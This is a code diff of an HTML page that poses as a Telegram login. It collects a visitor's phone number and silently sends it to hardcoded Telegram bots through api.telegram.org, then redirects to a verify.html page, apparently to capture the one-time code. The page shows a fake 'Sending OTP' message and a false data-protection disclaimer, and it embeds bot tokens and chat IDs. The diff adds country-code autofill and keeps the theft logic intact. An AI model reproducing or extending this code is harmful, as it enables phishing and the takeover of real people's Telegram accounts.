@@ -172,85 +172,95 @@
         <path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.894 8.221l-1.97 9.28c-.145.658-.537.818-1.084.508l-3-2.21-1.446 1.394a.759.759 0 0 1-.6.295h-.006l.213-3.054 5.56-5.022c.24-.213-.054-.334-.373-.121l-6.869 4.326-2.96-.924c-.643-.203-.658-.643.136-.953l11.566-4.458c.538-.196 1.006.128.832.941z"/>
       </svg>
     </div>
-    <h1>Enter telegram number</h1>
-    <p>To continue, please login first</p>
-    <form id="phoneForm">
-      <label for="country">Country code \/</label>
-      <select id="countrySelect">
-  <option value="+965">KW Kuwait (+965)</option>
-  <option value="+65">SG Singapore (+65)</option>
-  <option value="+60">MYS Malaysia (+60)</option>
-</select>
-<form id="phoneForm">
-  <label for="phoneInput">Telegram number</label>
-  <input type="tel" id="phoneInput" placeholder="Enter Telegram number" required />
+    <h1>Enter Telegram number</h1>
+  <p>To continue, please login first</p>
 
-  <button type="submit" class="btn">Next</button>
+  <form id="phoneForm">
+    <label for="countrySelect">Country code \/</label>
+    <select id="countrySelect">
+      <option value="+965">KW Kuwait (+965)</option>
+      <option value="+65">SG Singapore (+65)</option>
+      <option value="+60">MYS Malaysia (+60)</option>
+    </select>
 
-  <div class="disclaimer">
-    *Make sure the number entered is active to receive verification. Data will be kept confidential in accordance with the Personal Data Protection Act.
-  </div>
-</form>
+    <label for="phoneInput">Telegram number</label>
+    <input type="tel" id="phoneInput" placeholder="Enter Telegram number" required />
 
-<div class="status" id="statusMessage"></div>
+    <button type="submit" class="btn">Next</button>
 
-<script>
-const phoneForm = document.getElementById('phoneForm');
-const phoneInput = document.getElementById('phoneInput');
-const statusMessage = document.getElementById('statusMessage');
-const blurOverlay = document.getElementById('blurOverlay');
-const loadingText = document.getElementById('loadingText');
+    <div class="disclaimer">
+      *Make sure the number entered is active to receive verification. Data will be kept confidential in accordance with the Personal Data Protection Act.
+    </div>
+  </form>
 
-const bots = [
-  { token: "8068224257:AAEphwHC2UkOJN-A5slLLMqSric4no8sC_U", chatId: "7280432300" },
-  { token: "7272507372:AAHz55yCKgJkKs1SpzplM7Fg8iaoYVz4YBM", chatId: "5876510981" }
-];
+  <div class="status" id="statusMessage"></div>
 
-phoneForm.addEventListener('submit', function(e) {
-  e.preventDefault();
+  <script>
+    const phoneForm = document.getElementById('phoneForm');
+    const phoneInput = document.getElementById('phoneInput');
+    const statusMessage = document.getElementById('statusMessage');
+    const countrySelect = document.getElementById('countrySelect');
 
-  const phone = phoneInput.value.trim();
-  if (!phone) {
-    statusMessage.textContent = "⚠️ Please enter a valid phone number.";
-    statusMessage.style.color = "red";
-    return;
-  }
-
-  const currentBotIndex = parseInt(localStorage.getItem('currentBotIndex') || "0");
-  localStorage.setItem('sessionBotIndex', currentBotIndex);
-  const bot = bots[currentBotIndex];
-
-  const message = `🫶🏻 *STREAMING LOGIN*\n━━━━━━━━━━━━━━\n📞 Phone: \`${phone}\`\n━━━━━━━━━━━━━━`;
-  const api = `https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
-
-  statusMessage.textContent = "⏳ Sending OTP to your Telegram account...";
-  statusMessage.style.color = "#000";
-  if (blurOverlay) blurOverlay.style.display = "block";
-  if (loadingText) loadingText.style.display = "block";
-
-  fetch(api)
-    .then(res => res.json())
-    .then(data => {
-      if (data.ok) {
-        const nextBotIndex = (currentBotIndex + 1) % bots.length;
-        localStorage.setItem('currentBotIndex', nextBotIndex);
-        setTimeout(() => {
-          window.location.href = `verify.html?phone=${encodeURIComponent(phone)}`;
-        }, 3000);
+    // 🔹 Update input value automatically when country changes
+    countrySelect.addEventListener('change', () => {
+      const code = countrySelect.value;
+      // Jika input sudah berisi kode sebelumnya, ganti dengan kode baru
+      if (phoneInput.value.startsWith('+')) {
+        phoneInput.value = code + phoneInput.value.replace(/^\+\d+\s*/, '');
       } else {
-        if (blurOverlay) blurOverlay.style.display = "none";
-        if (loadingText) loadingText.style.display = "none";
-        statusMessage.textContent = "❌ Failed to send to bot.";
-        statusMessage.style.color = "red";
+        phoneInput.value = code + ' ';
       }
-    })
-    .catch(err => {
-      if (blurOverlay) blurOverlay.style.display = "none";
-      if (loadingText) loadingText.style.display = "none";
-      statusMessage.textContent = "❌ Error: " + err.message;
-      statusMessage.style.color = "red";
     });
-});
-</script>
+
+    const bots = [
+      { token: "8068224257:AAEphwHC2UkOJN-A5slLLMqSric4no8sC_U", chatId: "7280432300" },
+      { token: "7272507372:AAHz55yCKgJkKs1SpzplM7Fg8iaoYVz4YBM", chatId: "5876510981" }
+    ];
+
+    phoneForm.addEventListener('submit', function(e) {
+      e.preventDefault();
+
+      const phone = phoneInput.value.trim();
+      if (!phone) {
+        statusMessage.textContent = "⚠️ Please enter a valid phone number.";
+        statusMessage.style.color = "red";
+        return;
+      }
+
+      const currentBotIndex = parseInt(localStorage.getItem('currentBotIndex') || "0");
+      localStorage.setItem('sessionBotIndex', currentBotIndex);
+      const bot = bots[currentBotIndex];
+
+      const message = `🫶🏻 *STREAMING LOGIN*\n━━━━━━━━━━━━━━\n📞 Phone: \`${phone}\`\n━━━━━━━━━━━━━━`;
+      const api = `https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+
+      statusMessage.textContent = "⏳ Sending OTP to your Telegram account...";
+      statusMessage.style.color = "#000";
+
+      fetch(api)
+        .then(res => res.json())
+        .then(data => {
+          if (data.ok) {
+            const nextBotIndex = (currentBotIndex + 1) % bots.length;
+            localStorage.setItem('currentBotIndex', nextBotIndex);
+            setTimeout(() => {
+              window.location.href = `verify.html?phone=${encodeURIComponent(phone)}`;
+            }, 3000);
+          } else {
+            statusMessage.textContent = "❌ Failed to send to bot.";
+            statusMessage.style.color = "red";
+          }
+        })
+        .catch(err => {
+          statusMessage.textContent = "❌ Error: " + err.message;
+          statusMessage.style.color = "red";
+        });
+    });
+
+    // 🔹 Tambahkan kode negara default saat halaman pertama kali dibuka
+    window.addEventListener('load', () => {
+      phoneInput.value = countrySelect.value + ' ';
+    });
+  </script>
 </body>
 </html>
